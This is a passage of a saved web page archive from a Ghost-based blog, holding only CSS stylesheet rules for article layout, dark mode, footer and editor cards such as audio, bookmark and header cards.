figcaption a { text-decoration: underline; }

iframe.instagram-media { margin: 6vmin auto 0px !important; }

iframe.instagram-media + script + :not([id]) { margin-top: 6vmin; }

.kg-width-full.kg-card-hascaption { display: grid; grid-template-columns: i=
nherit; }

.kg-width-wide.kg-card-hascaption img { grid-column: wide-start / wide-end;=
 }

.kg-width-full.kg-card-hascaption img { grid-column: 1 / -1; }

.kg-width-full.kg-card-hascaption figcaption { grid-column: main-start / ma=
in-end; }

.article-comments { margin: 6vmin 0px 0px; }

.footnotes-sep { margin-bottom: 30px; }

.footnotes { font-size: 1.5rem; }

.footnotes p { margin: 0px; }

.footnote-backref { font-size: 1.2rem; font-weight: 700; box-shadow: none !=
important; text-decoration: none !important; }

.gh-content table:not(.gist table) { background: radial-gradient(at left ce=
nter, rgba(0, 0, 0, 0.2) 0px, transparent 75%) 0px center / 10px 100% no-re=
peat scroll, radial-gradient(at right center, rgba(0, 0, 0, 0.2) 0px, trans=
parent 75%) 100% center / 10px 100% scroll; border-collapse: collapse; bord=
er-spacing: 0px; display: inline-block; font-family: var(--font-sans); font=
-size: 1.6rem; max-width: 100%; overflow-x: auto; vertical-align: top; whit=
e-space: nowrap; width: auto; }

.gh-content table:not(.gist table) td:first-child { background-image: linea=
r-gradient(90deg, rgb(255, 255, 255) 50%, rgba(255, 255, 255, 0)); backgrou=
nd-repeat: no-repeat; background-size: 20px 100%; }

.gh-content table:not(.gist table) td:last-child { background-image: linear=
-gradient(270deg, rgb(255, 255, 255) 50%, rgba(255, 255, 255, 0)); backgrou=
nd-position: 100% 0px; background-repeat: no-repeat; background-size: 20px =
100%; }

.gh-content table:not(.gist table) th { background-color: rgb(244, 248, 251=
); color: var(--color-darkgrey); font-size: 1.2rem; font-weight: 700; lette=
r-spacing: 0.2px; text-align: left; text-transform: uppercase; }

.gh-content table:not(.gist table) td, .gh-content table:not(.gist table) t=
h { border: 1px solid rgb(226, 236, 243); padding: 6px 12px; }

.article-byline { display: flex; justify-content: space-between; margin: mi=
n(24px, 5.6vmin) 0px 0px; }

.article-byline-content { align-items: center; display: flex; flex-grow: 1;=
 }

.article-byline-content .author-list { justify-content: flex-start; padding=
: 0px 14px 0px 0px; }

.article-byline-meta { color: var(--color-secondary-text); font-size: 1.4re=
m; line-height: 1.2em; }

.article-byline-meta .author-name { font-size: 1.7rem; font-weight: 700; le=
tter-spacing: 0px; margin: 0px 0px 6px; }

.article-byline-meta .bull { display: inline-block; margin: 0px 2px; }

.author-avatar { background-color: var(--color-border); border: 2px solid r=
gb(255, 255, 255); border-radius: 50%; display: block; height: min(56px, 13=
.6vmin); margin: 0px -4px; overflow: hidden; width: min(56px, 13.6vmin); }

.page-template .article-title { margin-bottom: 0px; }

@media (max-width: 767px) {
  .article-byline-content .author-list { padding-right: 12px; }
  .article-byline-meta .author-name { margin-bottom: 4px; }
}

.footer-cta { position: relative; text-align: center; }

.footer-cta-title { font-size: clamp(2.6rem, 5vw, 3.8rem); font-weight: 800=
; margin: 0px 0px min(24px, 6.4vmin); }

.has-serif-title .footer-cta-title { font-family: var(--font-serif); }

.footer-cta-button { align-items: center; background: rgb(255, 255, 255); b=
order: 1px solid var(--color-border); border-radius: 8px; color: var(--colo=
r-secondary-text); display: inline-flex; font-size: 1.7rem; justify-content=
: space-between; max-width: 500px; padding: 5px 5px 5px 15px; position: rel=
ative; transition: border-color 0.2s ease 0s; width: 100%; }

.footer-cta-button:hover { border-color: rgb(194, 194, 194); }

.footer-cta-button span { background: var(--ghost-accent-color); border-rad=
ius: 6px; color: rgb(255, 255, 255); display: inline-block; font-size: 1.6r=
em; font-weight: 600; letter-spacing: -0.005em; padding: 9px 15px; }

.read-more-wrap { margin-top: 2.4vmin; }

.footer-cta + .read-more-wrap { margin-top: max(12vmin, 72px); }

.read-more { gap: 4vmin; display: grid; grid-template-columns: repeat(6, 1f=
r); }

.read-more .post-card-tags { display: none; }

@media (max-width: 1000px) {
  .read-more { grid-template-columns: repeat(4, 1fr); }
  .read-more .post-card:nth-child(3) { display: none; }
}

@media (max-width: 700px) {
  .read-more { grid-template-columns: repeat(2, 1fr); }
  .read-more .post-card:nth-child(2) { display: none; }
}

.comments { align-items: center; display: flex; flex-direction: column; mar=
gin: 60px 0px 44px; }

.comments-head { align-items: baseline; display: flex; justify-content: spa=
ce-between; margin-bottom: 32px; max-width: 720px; width: 100%; }

.comments h2 { font-size: 3.4rem; font-weight: 800; max-width: 720px; width=
: 100%; }

.comments .comment-count { color: var(--color-midgrey); font-weight: 600; w=
hite-space: nowrap; }

.comments #ghost-comments-root { max-width: 720px; width: 100%; }

.author-profile-pic { background: rgb(255, 255, 255); border-radius: 50%; d=
isplay: block; height: 80px; margin: 0px 0px 2rem; object-fit: cover; width=
: 80px; }

.author-profile-footer { margin-top: 16px; }

.author-profile-location { font-weight: 700; }

.author-profile-meta { display: flex; gap: 10px; }

.author-profile-social-link { color: var(--color-secondary-text); font-size=
: 1.3rem; }

.author-profile-social-link:hover { color: var(--color-darkgrey); }

.author-profile-social-link svg { height: 16px; width: 16px; }

@media (min-width: 1001px) {
  .author-template .post-card-large .post-card-content:only-child { grid-co=
lumn: span 2 / auto; max-width: 640px; }
}

.tag-template .post-card-large .post-card-image-link { grid-column: 2 / spa=
n 2; order: 2; }

.tag-template .post-card-large .post-card-content { order: 1; }

@media (min-width: 1001px) {
  .tag-template .post-card-large .post-card-content:only-child { grid-colum=
n: span 2 / auto; max-width: 640px; }
}

.error-content { padding: 14vw 4vw 2vw; }

.error-message { padding-bottom: 10vw; text-align: center; }

.error-code { font-size: 12vw; letter-spacing: -5px; line-height: 1em; marg=
in: 0px; }

.error-description { color: var(--color-secondary-text); font-size: 3.2rem;=
 font-weight: 400; letter-spacing: -0.005em; line-height: 1.3em; margin: 0p=
x; }

.error-link { display: inline-block; margin-top: 5px; }

@media (min-width: 940px) {
  .error-content .post-card { border-bottom: none; margin-bottom: 0px; padd=
ing-bottom: 0px; }
}

@media (max-width: 800px) {
  .error-content { padding-top: 24vw; }
  .error-code { font-size: 11.2rem; }
  .error-message { padding-bottom: 16vw; }
  .error-description { font-size: 1.8rem; margin: 5px 0px 0px; }
}

@media (max-width: 500px) {
  .error-content { padding-top: 28vw; }
  .error-message { padding-bottom: 14vw; }
}

.site-footer { background: rgb(10, 11, 12); color: rgb(255, 255, 255); marg=
in: max(12vmin, 64px) 0px 0px; padding-bottom: 140px; padding-top: 48px; po=
sition: relative; }

.site-footer .inner { gap: 40px; color: rgba(255, 255, 255, 0.698); display=
: grid; font-size: 1.3rem; grid-template-columns: auto 1fr auto; }

.site-footer .copyright a { color: rgb(255, 255, 255); font-weight: 500; le=
tter-spacing: -0.015em; }

.site-footer a { color: rgba(255, 255, 255, 0.698); }

.site-footer a:hover { color: rgb(255, 255, 255); text-decoration: none; }

.site-footer-nav ul { display: flex; flex-wrap: wrap; justify-content: cent=
er; list-style: none; margin: 0px 0px 20px; padding: 0px; }

.site-footer-nav li { align-items: center; display: inline-flex; line-heigh=
t: 2em; margin: 0px; padding: 0px; }

.site-footer-nav a { align-items: center; display: inline-flex; margin-left=
: 10px; position: relative; }

.site-footer-nav li:not(:first-child) a::before { background: rgb(255, 255,=
 255); border-radius: 100%; content: ""; display: block; height: 2px; margi=
n: 0px 10px 0px 0px; width: 2px; }

@media (max-width: 767px) {
  .site-footer .inner { gap: 0px; grid-template-columns: 1fr; max-width: 50=
0px; text-align: center; }
  .site-footer .copyright, .site-footer .copyright a { color: rgb(255, 255,=
 255); font-size: 1.5rem; }
  .site-footer .copyright { margin-bottom: 16px; }
}

html.dark-mode body { background: var(--color-darkmode); color: rgba(255, 2=
55, 255, 0.75); }

html.dark-mode img { opacity: 0.9; }

html.dark-mode kbd { background: rgb(33, 36, 39); }

html.dark-mode figcaption a { color: rgb(255, 255, 255); }

html.dark-mode .gh-head { background: var(--color-darkmode); color: rgb(255=
, 255, 255); }

html.dark-mode .gh-burger-box, html.dark-mode .site-header-content { color:=
 rgb(255, 255, 255); }

html.dark-mode .post-card-image { background: var(--color-darkmode); }

html.dark-mode :is(.post-card-tags, .post-card-meta, .article-tag a, .bylin=
e-meta-content, .pagination .page-number) { color: rgb(95, 95, 95); }

html.dark-mode .post-card-featured, html.dark-mode .post-card-title { color=
: rgb(255, 255, 255); }

html.dark-mode .post-card-excerpt { color: var(--color-secondary-text); }

html.dark-mode .article-title, html.dark-mode .author-profile-location, htm=
l.dark-mode .author-profile-social-link:hover, html.dark-mode .pagination a=
 { color: rgb(255, 255, 255); }

html.dark-mode .article-excerpt { color: var(--color-secondary-text); }

html.dark-mode .post-full-image { background-color: rgb(40, 43, 47); }

html.dark-mode .author-avatar { background-color: rgb(40, 43, 47); border-c=
olor: var(--color-darkmode); }

html.dark-mode .author-profile-image { opacity: 1; }

html.dark-mode .author-profile-image path { fill: var(--color-darkmode); }

html.dark-mode .article-byline-meta .author-name a { color: rgb(255, 255, 2=
55); }

html.dark-mode .no-image .author-social-link a { color: rgba(255, 255, 255,=
 0.75); }

html.dark-mode .gh-content > [id] { color: rgba(255, 255, 255, 0.9); }

html.dark-mode .gh-content pre { background: rgb(3, 3, 3); }

html.dark-mode .gh-content :not(pre) > code { background: rgb(35, 38, 43); =
border-color: rgb(40, 43, 47); color: var(--color-wash); }

:where(html.dark-mode) .gh-content a { color: rgb(255, 255, 255); }

html.dark-mode .gh-content em, html.dark-mode .gh-content strong { color: r=
gb(255, 255, 255); }

html.dark-mode .gh-content code { background: rgb(0, 0, 0); color: rgb(255,=
 255, 255); }

html.dark-mode hr { border-top-color: rgb(40, 43, 47); }

html.dark-mode .gh-content hr::after { background: rgb(40, 43, 47); box-sha=
dow: var(--color-darkmode) 0 0 0 5px; }

html.dark-mode figcaption { color: rgba(255, 255, 255, 0.6); }

html.dark-mode .gh-content table:not(.gist table) td:first-child { backgrou=
nd-image: linear-gradient(to right,var(--color-darkmode) 50%,rgba(21,23,25,=
0) 100%); }

html.dark-mode .gh-content table:not(.gist table) td:last-child { backgroun=
d-image: linear-gradient(to left,var(--color-darkmode) 50%,rgba(21,23,25,0)=
 100%); }

html.dark-mode .gh-content table:not(.gist table) th { background-color: rg=
b(40, 43, 47); color: rgba(255, 255, 255, 0.85); }

html.dark-mode .gh-content table:not(.gist table) td, html.dark-mode .gh-co=
ntent table:not(.gist table) th { border: 1px solid rgb(40, 43, 47); }

html.dark-mode .gh-content input { color: rgb(48, 58, 62); }

html.dark-mode .site-archive-header .no-image { background: var(--color-dar=
kmode); color: rgba(255, 255, 255, 0.9); }

html.dark-mode .kg-header-card.kg-style-dark { background: rgb(10, 11, 12);=
 }

html.dark-mode .kg-header-card.kg-style-light { background: rgb(32, 35, 40)=
; }

html.dark-mode .footer-cta-title, html.dark-mode .kg-header-card h2.kg-head=
er-card-header, html.dark-mode .kg-header-card h3.kg-header-card-subheader =
{ color: rgb(255, 255, 255); }

@media (prefers-color-scheme: dark) {
  html.auto-color body { background: var(--color-darkmode); color: rgba(255=
, 255, 255, 0.75); }
  html.auto-color img { opacity: 0.9; }
  html.auto-color kbd { background: rgb(33, 36, 39); }
  html.auto-color figcaption a { color: rgb(255, 255, 255); }
  html.auto-color .gh-head { background: var(--color-darkmode); color: rgb(=
255, 255, 255); }
  html.auto-color .gh-burger-box, html.auto-color .site-header-content { co=
lor: rgb(255, 255, 255); }
  html.auto-color .post-card-image { background: var(--color-darkmode); }
  html.auto-color :is(.post-card-tags, .post-card-meta, .article-tag a, .by=
line-meta-content, .pagination .page-number) { color: rgb(95, 95, 95); }
  html.auto-color .post-card-featured, html.auto-color .post-card-title { c=
olor: rgb(255, 255, 255); }
  html.auto-color .post-card-excerpt { color: var(--color-secondary-text); =
}
  html.auto-color .article-title, html.auto-color .author-profile-location,=
 html.auto-color .author-profile-social-link:hover, html.auto-color .pagina=
tion a { color: rgb(255, 255, 255); }
  html.auto-color .article-excerpt { color: var(--color-secondary-text); }
  html.auto-color .post-full-image { background-color: rgb(40, 43, 47); }
  html.auto-color .author-avatar { background-color: rgb(40, 43, 47); borde=
r-color: var(--color-darkmode); }
  html.auto-color .author-profile-image { opacity: 1; }
  html.auto-color .author-profile-image path { fill: var(--color-darkmode);=
 }
  html.auto-color .article-byline-meta .author-name a { color: rgb(255, 255=
, 255); }
  html.auto-color .no-image .author-social-link a { color: rgba(255, 255, 2=
55, 0.75); }
  html.auto-color .gh-content > [id] { color: rgba(255, 255, 255, 0.9); }
  html.auto-color .gh-content pre { background: rgb(3, 3, 3); }
  html.auto-color .gh-content :not(pre) > code { background: rgb(35, 38, 43=
); border-color: rgb(40, 43, 47); color: var(--color-wash); }
  :where(html.auto-color) .gh-content a { color: rgb(255, 255, 255); }
  html.auto-color .gh-content em, html.auto-color .gh-content strong { colo=
r: rgb(255, 255, 255); }
  html.auto-color .gh-content code { background: rgb(0, 0, 0); color: rgb(2=
55, 255, 255); }
  html.auto-color hr { border-top-color: rgb(40, 43, 47); }
  html.auto-color .gh-content hr::after { background: rgb(40, 43, 47); box-=
shadow: var(--color-darkmode) 0 0 0 5px; }
  html.auto-color figcaption { color: rgba(255, 255, 255, 0.6); }
  html.auto-color .gh-content table:not(.gist table) td:first-child { backg=
round-image: linear-gradient(to right,var(--color-darkmode) 50%,rgba(21,23,=
25,0) 100%); }
  html.auto-color .gh-content table:not(.gist table) td:last-child { backgr=
ound-image: linear-gradient(to left,var(--color-darkmode) 50%,rgba(21,23,25=
,0) 100%); }
  html.auto-color .gh-content table:not(.gist table) th { background-color:=
 rgb(40, 43, 47); color: rgba(255, 255, 255, 0.85); }
  html.auto-color .gh-content table:not(.gist table) td, html.auto-color .g=
h-content table:not(.gist table) th { border: 1px solid rgb(40, 43, 47); }
  html.auto-color .gh-content input { color: rgb(48, 58, 62); }
  html.auto-color .site-archive-header .no-image { background: var(--color-=
darkmode); color: rgba(255, 255, 255, 0.9); }
  html.auto-color .kg-header-card.kg-style-dark { background: rgb(10, 11, 1=
2); }
  html.auto-color .kg-header-card.kg-style-light { background: rgb(32, 35, =
40); }
  html.auto-color .footer-cta-title, html.auto-color .kg-header-card h2.kg-=
header-card-header, html.auto-color .kg-header-card h3.kg-header-card-subhe=
ader { color: rgb(255, 255, 255); }
}
------MultipartBoundary--3mZeTGxybzrXQ57yZcOtuaPaDgF9pQQ9qye7bc9mn1----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://pwning.tech/public/cards.min.css?v=4edf52f83a

@charset "utf-8";

.kg-audio-card, .kg-audio-card * { box-sizing: border-box; }

.kg-audio-card { display: flex; width: 100%; min-height: 96px; border-radiu=
s: 3px; box-shadow: rgba(124, 139, 154, 0.25) 0px 0px 0px 1px inset; }

.kg-audio-card + .kg-audio-card { margin-top: 1em; }

.kg-audio-thumbnail { display: flex; justify-content: center; align-items: =
center; width: 80px; min-width: 80px; margin: 8px; background: 0px 0px; obj=
ect-fit: cover; aspect-ratio: 1 / 1; border-radius: 2px; }

.kg-audio-thumbnail.placeholder { background: var(--ghost-accent-color); }

.kg-audio-thumbnail.placeholder svg { width: 24px; height: 24px; fill: rgb(=
255, 255, 255); }

.kg-audio-player-container { position: relative; display: flex; flex-direct=
ion: column; justify-content: space-between; width: 100%; --seek-before-wid=
th: 0%; --volume-before-width: 100%; --buffered-width: 0%; }

.kg-audio-title { width: 100%; margin: 8px 0px 0px; padding: 8px 12px; bord=
er: 0px; font-family: inherit; font-size: 1.15em; font-weight: 700; line-he=
ight: 1.15em; background: 0px 0px; }

.kg-audio-player { display: flex; flex-grow: 1; align-items: center; paddin=
g: 8px 12px; }

.kg-audio-current-time, .kg-audio-time { font-family: inherit; font-size: 0=
.85em; font-weight: 500; line-height: 1.4em; white-space: nowrap; }

.kg-audio-current-time { min-width: 38px; padding: 0px 4px; }

.kg-audio-time { width: 56px; color: rgb(171, 171, 171); }

.kg-audio-duration { padding: 0px 4px; }

.kg-audio-pause-icon, .kg-audio-play-icon { position: relative; bottom: 1px=
; padding: 0px 4px 0px 0px; font-size: 0px; background: 0px 0px; }

.kg-audio-hide { display: none !important; }

.kg-audio-pause-icon svg, .kg-audio-play-icon svg { width: 14px; height: 14=
px; fill: currentcolor; }

.kg-audio-seek-slider { flex-grow: 1; margin: 0px 4px; }

@media (max-width: 640px) {
  .kg-audio-seek-slider { display: none; }
}

.kg-audio-playback-rate { min-width: 37px; padding: 0px 4px; font-family: i=
nherit; font-size: 0.85em; font-weight: 600; line-height: 1.4em; text-align=
: left; background: 0px 0px; white-space: nowrap; }

@media (max-width: 640px) {
  .kg-audio-playback-rate { padding-left: 8px; }
}

.kg-audio-mute-icon, .kg-audio-unmute-icon { position: relative; bottom: -1=
px; padding: 0px 4px; font-size: 0px; background: 0px 0px; }

@media (max-width: 640px) {
  .kg-audio-mute-icon, .kg-audio-unmute-icon { margin-left: auto; }
}

.kg-audio-mute-icon svg, .kg-audio-unmute-icon svg { width: 16px; height: 1=
6px; fill: currentcolor; }

.kg-audio-volume-slider { width: 80px; }

@media (max-width: 400px) {
  .kg-audio-volume-slider { display: none; }
}

.kg-audio-seek-slider::before, .kg-audio-volume-slider::before { content: "=
"; position: absolute; left: 0px; height: 4px; cursor: pointer; background-=
color: currentcolor; border-radius: 2px; width: var(--seek-before-width) !i=
mportant; }

.kg-audio-volume-slider::before { width: var(--volume-before-width) !import=
ant; }

.kg-audio-player-container input[type=3D"range"] { position: relative; appe=
arance: none; background: 0px 0px; height: auto; padding: 0px; border: 0px;=
 }

.kg-audio-player-container input[type=3D"range"]:focus, .kg-video-card inpu=
t[type=3D"range"]:focus { outline: 0px; }

.kg-audio-player-container input[type=3D"range"]::-webkit-slider-thumb { ap=
pearance: none; }

.kg-audio-player-container button, .kg-video-card button { display: flex; a=
lign-items: center; border: 0px; cursor: pointer; }

.kg-audio-player-container input[type=3D"range"]::-webkit-slider-runnable-t=
rack { width: 100%; height: 4px; cursor: pointer; background: rgba(124, 139=
, 154, 0.25); border-radius: 2px; }

.kg-audio-player-container input[type=3D"range"]::-webkit-slider-thumb { po=
sition: relative; box-sizing: content-box; width: 13px; height: 13px; margi=
n: -5px 0px 0px; border: 0px; cursor: pointer; background: rgb(255, 255, 25=
5); border-radius: 50%; box-shadow: rgba(0, 0, 0, 0.08) 0px 0px 0px 1px, rg=
ba(0, 0, 0, 0.24) 0px 1px 4px; }

.kg-audio-player-container input[type=3D"range"]:active::-webkit-slider-thu=
mb { transform: scale(1.2); }

.kg-before-after-card > div { position: relative; margin: 0px auto; }

.kg-before-after-card-image-before { position: absolute; overflow: hidden; =
top: 0px; left: 0px; height: 100%; }

.kg-before-after-card .kg-before-after-card-image-after img { width: 100%; =
}

.kg-before-after-card .kg-before-after-card-image-before img { max-width: n=
one; object-fit: cover; }

.kg-before-after-card input { position: absolute; top: 0px; appearance: non=
e; width: 100%; height: 100%; background: 0px 0px; outline: 0px; margin: 0p=
x; }

.kg-before-after-card input::-webkit-slider-thumb { appearance: none; width=
: 5px; height: 100%; background: rgb(255, 255, 255); cursor: pointer; }

.kg-before-after-card-slider-handle { pointer-events: none; position: absol=
ute; width: 30px; height: 30px; border-radius: 50%; background-color: rgb(2=
55, 255, 255); left: calc(50% - 18px); top: calc(50% - 18px); display: flex=
; justify-content: center; align-items: center; }

.kg-before-after-card-slider-handle::after, .kg-before-after-card-slider-ha=
ndle::before { transform: rotate(-45deg); content: ""; padding: 3px; displa=
y: inline-block; border-style: solid; border-color: rgb(93, 93, 93); border=
-image: initial; border-width: 0px 2px 2px 0px; }

.kg-before-after-card-slider-handle::before { transform: rotate(135deg); }

.kg-blockquote-alt { font-size: 1.5em; font-style: italic; line-height: 1.7=
em; text-align: center; padding: 0px 2.5em; }

@media (max-width: 800px) {
  .kg-blockquote-alt { font-size: 1.4em; padding-left: 2em; padding-right: =
2em; }
}

@media (max-width: 600px) {
  .kg-blockquote-alt { font-size: 1.2em; padding-left: 1.75em; padding-righ=
t: 1.75em; }
}

.kg-bookmark-card, .kg-bookmark-card * { box-sizing: border-box; }

.kg-bookmark-card, .kg-bookmark-publisher { position: relative; width: 100%=
; }

.kg-bookmark-card a.kg-bookmark-container, .kg-bookmark-card a.kg-bookmark-=
container:hover { display: flex; text-decoration: none; border-radius: 3px;=
 border: 1px solid rgba(124, 139, 154, 0.25); overflow: hidden; color: inhe=
rit; }

.kg-bookmark-content { display: flex; flex-direction: column; flex-grow: 1;=
 flex-basis: 100%; align-items: flex-start; justify-content: flex-start; pa=
dding: 20px; overflow: hidden; }

.kg-bookmark-title { font-size: 1.5rem; line-height: 1.4em; font-weight: 60=
0; }

.kg-bookmark-description { display: -webkit-box; font-size: 1.4rem; line-he=
ight: 1.5em; margin-top: 3px; font-weight: 400; max-height: 44px; overflow-=
y: hidden; opacity: 0.7; -webkit-line-clamp: 2; -webkit-box-orient: vertica=
l; }

.kg-bookmark-metadata { display: flex; align-items: center; margin-top: 22p=
x; width: 100%; font-size: 1.4rem; font-weight: 500; white-space: nowrap; }

.kg-bookmark-metadata > :not(img) { opacity: 0.7; }

.kg-bookmark-icon { width: 20px; height: 20px; margin-right: 6px; }

.kg-bookmark-author { display: inline; }

.kg-bookmark-publisher { text-overflow: ellipsis; overflow: hidden; max-wid=
th: 240px; white-space: nowrap; display: block; line-height: 1.65em; }

.kg-bookmark-metadata > span:nth-of-type(2) { font-weight: 400; }

.kg-bookmark-metadata > span:nth-of-type(2)::before { content: "=E2=80=A2";=
 margin: 0px 6px; }

.kg-bookmark-metadata > span:last-of-type { overflow: hidden; text-overflow=
: ellipsis; }

.kg-bookmark-thumbnail { position: relative; flex-grow: 1; min-width: 33%; =
}

.kg-bookmark-thumbnail img { width: 100%; height: 100%; object-fit: cover; =
position: absolute; top: 0px; left: 0px; border-radius: 0px 2px 2px 0px; }

.kg-button-card, .kg-button-card * { box-sizing: border-box; }

.kg-button-card, .kg-button-card a.kg-btn { display: flex; position: static=
; align-items: center; }

.kg-button-card { width: 100%; justify-content: center; }

.kg-button-card.kg-align-left { justify-content: flex-start; }

.kg-button-card a.kg-btn { padding: 0px 1.2em; height: 2.4em; line-height: =
1em; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ox=
ygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-=
serif; font-size: 0.95em; font-weight: 600; text-decoration: none; border-r=
adius: 5px; transition: opacity 0.2s ease-in-out 0s; }

.kg-button-card a.kg-btn:hover { opacity: 0.85; }

.kg-button-card a.kg-btn-accent { background-color: var(--ghost-accent-colo=
r); color: rgb(255, 255, 255); }

.kg-callout-card, .kg-callout-card * { box-sizing: border-box; }

.kg-callout-card { display: flex; padding: 1.2em 1.6em; border-radius: 3px;=
 }

.kg-callout-card-grey { background: rgba(124, 139, 154, 0.13); }

.kg-callout-card-white { background: 0px 0px; box-shadow: rgba(124, 139, 15=
4, 0.25) 0px 0px 0px 1px inset; }

.kg-callout-card-blue { background: rgba(33, 172, 232, 0.12); }

.kg-callout-card-green { background: rgba(52, 183, 67, 0.12); }

.kg-callout-card-yellow { background: rgba(240, 165, 15, 0.13); }

.kg-callout-card-red { background: rgba(209, 46, 46, 0.11); }

.kg-callout-card-pink { background: rgba(225, 71, 174, 0.11); }

.kg-callout-card-purple { background: rgba(135, 85, 236, 0.12); }

.kg-callout-card-accent { background: var(--ghost-accent-color); color: rgb=
(255, 255, 255); }

.kg-callout-card.kg-callout-card-accent a { color: rgb(255, 255, 255); text=
-decoration: underline; }

.kg-callout-card div.kg-callout-emoji { padding-right: 0.8em; line-height: =
1.25em; font-size: 1.15em; }

.kg-callout-card div.kg-callout-text { font-size: 0.95em; line-height: 1.5e=
m; }

.kg-callout-card + .kg-callout-card { margin-top: 1em; }

.kg-file-card, .kg-file-card * { box-sizing: border-box; }

.kg-file-card { display: flex; }

.kg-file-card a.kg-file-card-container { display: flex; align-items: stretc=
h; justify-content: space-between; color: inherit; padding: 6px; min-height=
: 92px; border: 1px solid rgba(124, 139, 154, 0.25); border-radius: 3px; tr=
ansition: all 0.35s ease-in-out 0s; text-decoration: none; width: 100%; }

.kg-file-card a.kg-file-card-container:hover { border: 1px solid rgba(124, =
139, 154, 0.35); }

.kg-file-card-contents { display: flex; flex-direction: column; justify-con=
tent: space-between; margin: 4px 8px; width: 100%; }

.kg-file-card-title { font-size: 1.15em; font-weight: 700; line-height: 1.3=
em; }

.kg-file-card-caption { font-size: 0.95em; line-height: 1.3em; opacity: 0.6=
; }

.kg-file-card-title + .kg-file-card-caption { margin-top: -3px; }

.kg-file-card-metadata { display: inline; font-size: 0.825em; line-height: =
1.3em; margin-top: 2px; }

.kg-file-card-filename { display: inline; font-weight: 500; }

.kg-file-card-filesize { display: inline-block; font-size: 0.925em; opacity=
: 0.6; }

.kg-file-card-filesize::before { display: inline-block; content: "=E2=80=A2=
"; margin-right: 4px; }

.kg-file-card-icon { position: relative; display: flex; align-items: center=
; justify-content: center; width: 80px; min-width: 80px; height: 100%; }

.kg-file-card-icon::before { position: absolute; display: block; content: "=
"; inset: 0px; background: currentcolor; opacity: 0.06; transition: opacity=
 0.35s ease-in-out 0s; border-radius: 2px; }

.kg-file-card a.kg-file-card-container:hover .kg-file-card-icon::before { o=
pacity: 0.08; }

.kg-file-card-icon svg { width: 24px; height: 24px; color: var(--ghost-acce=
nt-color); }

.kg-file-card-medium a.kg-file-card-container { min-height: 72px; }

.kg-file-card-medium .kg-file-card-caption { opacity: 1; font-weight: 500; =
}

.kg-file-card-small a.kg-file-card-container { align-items: center; min-hei=
ght: 52px; }

.kg-file-card-small .kg-file-card-metadata { font-size: 1em; margin-top: 0p=
x; }

.kg-file-card-small .kg-file-card-icon svg { width: 20px; height: 20px; }

.kg-file-card + .kg-file-card { margin-top: 1em; }

.kg-gallery-card, .kg-gallery-card * { box-sizing: border-box; }

.kg-gallery-card, .kg-image-card { --gap: 1.2rem; }

.kg-gallery-card:not(.kg-card-hascaption) + .kg-gallery-card, .kg-gallery-c=
ard:not(.kg-card-hascaption) + .kg-image-card, .kg-image-card:not(.kg-card-=
hascaption) + .kg-gallery-card, .kg-image-card:not(.kg-card-hascaption) + .=
kg-image-card { margin-top: var(--gap); }

.kg-gallery-container { position: relative; }

.kg-gallery-row { display: flex; flex-direction: row; justify-content: cent=
er; }

.kg-gallery-image img { display: block; margin: 0px; width: 100%; height: 1=
00%; }

.kg-gallery-row:not(:first-of-type) { margin: var(--gap)0 0; }

.kg-gallery-image:not(:first-of-type) { margin: 0 0 0 var(--gap); }

@media (max-width: 600px) {
  .kg-gallery-card, .kg-image-card { --gap: 0.6rem; }
}

.kg-header-card, .kg-header-card * { box-sizing: border-box; }

.kg-header-card { padding: 12vmin 4em; min-height: 60vh; display: flex; fle=
x-direction: column; align-items: center; justify-content: center; text-ali=
gn: center; }

.kg-header-card.kg-size-small { padding-top: 14vmin; padding-bottom: 14vmin=
; min-height: 40vh; }

.kg-header-card.kg-size-large { padding-top: 18vmin; padding-bottom: 18vmin=
; min-height: 80vh; }

.kg-header-card.kg-align-left { text-align: left; align-items: flex-start; =
}

.kg-header-card.kg-style-dark { background: rgb(21, 21, 21); color: rgb(255=
, 255, 255); }

.kg-header-card.kg-style-light { background-color: rgb(250, 250, 250); }

.kg-header-card.kg-style-accent { background-color: var(--ghost-accent-colo=
r); }

.kg-header-card.kg-style-image { position: relative; background-color: rgb(=
231, 231, 231); background-size: cover; background-position: center center;=
 }

.kg-header-card.kg-style-image::before { position: absolute; display: block=
; content: ""; inset: 0px; background: linear-gradient(0deg, transparent, r=
gba(0, 0, 0, 0.2)); }

.kg-header-card h2.kg-header-card-header { font-size: 5em; font-weight: 700=
; line-height: 1.1em; letter-spacing: -0.01em; margin: 0px; }

.kg-header-card h2.kg-header-card-header strong { font-weight: 800; }

.kg-header-card.kg-size-small h2.kg-header-card-header { font-size: 4em; }

.kg-header-card.kg-size-large h2.kg-header-card-header { font-size: 6em; }

.kg-header-card h3.kg-header-card-subheader { font-size: 1.5em; font-weight=
: 500; line-height: 1.4em; margin: 0px; max-width: 40em; }

.kg-header-card h2 + h3.kg-header-card-subheader { margin: 0.35em 0px 0px; =
}

.kg-header-card h3.kg-header-card-subheader strong { font-weight: 600; }

.kg-header-card.kg-size-small h3.kg-header-card-subheader { font-size: 1.25=
em; }

.kg-header-card.kg-size-large h3.kg-header-card-subheader { font-size: 1.75=
em; }

.kg-header-card:not(.kg-style-light) h2.kg-header-card-header, .kg-header-c=
ard:not(.kg-style-light) h3.kg-header-card-subheader { color: rgb(255, 255,=
 255); }

.kg-header-card.kg-style-accent h3.kg-header-card-subheader, .kg-header-car=
d.kg-style-image h3.kg-header-card-subheader, .kg-product-card-rating-activ=
e.kg-product-card-rating-star svg { opacity: 1; }

.kg-header-card.kg-style-image a.kg-header-card-button, .kg-header-card.kg-=
style-image h2.kg-header-card-header, .kg-header-card.kg-style-image h3.kg-=
header-card-subheader { z-index: 999; }

.kg-header-card h2.kg-header-card-header a, .kg-header-card h3.kg-header-ca=
rd-subheader a { color: var(--ghost-accent-color); }

.kg-header-card.kg-style-accent h2.kg-header-card-header a, .kg-header-card=
.kg-style-accent h3.kg-header-card-subheader a, .kg-header-card.kg-style-im=
age h2.kg-header-card-header a, .kg-header-card.kg-style-image h3.kg-header=
-card-subheader a { color: rgb(255, 255, 255); }

.kg-header-card a.kg-header-card-button { display: flex; position: static; =
align-items: center; fill: rgb(255, 255, 255); background: rgb(255, 255, 25=
5); border-radius: 3px; outline: 0px; font-family: -apple-system, BlinkMacS=
ystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Dro=
id Sans", "Helvetica Neue", sans-serif; font-size: 1.05em; font-weight: 600=
